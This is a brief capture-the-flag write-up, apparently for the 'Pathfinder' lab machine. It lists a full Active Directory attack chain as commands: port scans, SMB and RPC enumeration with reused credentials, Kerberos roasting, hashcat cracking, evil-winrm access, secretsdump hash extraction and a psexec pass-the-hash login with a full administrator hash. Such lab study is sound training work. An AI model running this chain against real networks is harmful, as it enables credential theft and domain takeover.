* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)

## Recon-Enumeration  

sudo masscan -p1-65535 10.10.10.30 -e tun0 --rate=1000  
![alt text](./img/pathfinder05.PNG?raw=true)  
  
Only usefull information with the command “enum4linux”  
![alt text](./img/pathfinder01.PNG?raw=true)  

nmap -A -p 49667,49720,49676,49677,593,139,3269,389,9389,135,3268,49664,464,47001,636,49700,49665,49666,49672,5985,445,53,49683,88 10.10.10.30  
![alt text](./img/pathfinder02.PNG?raw=true)  

Tried to connect with smbclient  
![alt text](./img/pathfinder03.PNG?raw=true)  

Hummm let’s try with the credential found on SHIELD machine  
![alt text](./img/pathfinder04.PNG?raw=true)  

rpcclient 10.10.10.30 -W=MEGACORP -U=sandra  
![alt text](./img/pathfinder06.PNG?raw=true)  

GetUserSPNs.py MEGACORP.LOCAL/sandra:Password1234! -dc-ip 10.10.10.30 -request  
![alt text](./img/pathfinder07.PNG?raw=true)  

## Exploit  
GetNPUsers.py MEGACORP.LOCAL/sandra:SANDRA_PASSWORD! -dc-ip 10.10.10.30 -request  
![alt text](./img/pathfinder08.PNG?raw=true)  

Save the hash in a file and use hashcat to breakit  
hashcat -m 18200 -o cracked krb.txt ~/wordlists/rockyou.txt  
![alt text](./img/pathfinder09.PNG?raw=true)  

Now just connect it with evil-winrm  
evil-winrm -i 10.10.10.30 -u svc_bes -p SVCBES_PASSWORD  
![alt text](./img/pathfinder10.PNG?raw=true)  

Just go to the desktop file and get the flag  
![alt text](./img/pathfinder11.PNG?raw=true)  

## Privesc  
Just run the secretdump.py to get the NTLM hashes  
secretsdump.py MEGACORP.LOCAL/svc_bes:SVCBES_PASSWORD@10.10.10.30 -dc-ip 10.10.10.30  
![alt text](./img/pathfinder12.PNG?raw=true)  

Now we can just use psexec.py with pass-the-hash to access the machine  
psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18  
![alt text](./img/pathfinder13.PNG?raw=true)  
  
![alt text](./img/pathfinder14.PNG?raw=true)  

## Discoveries

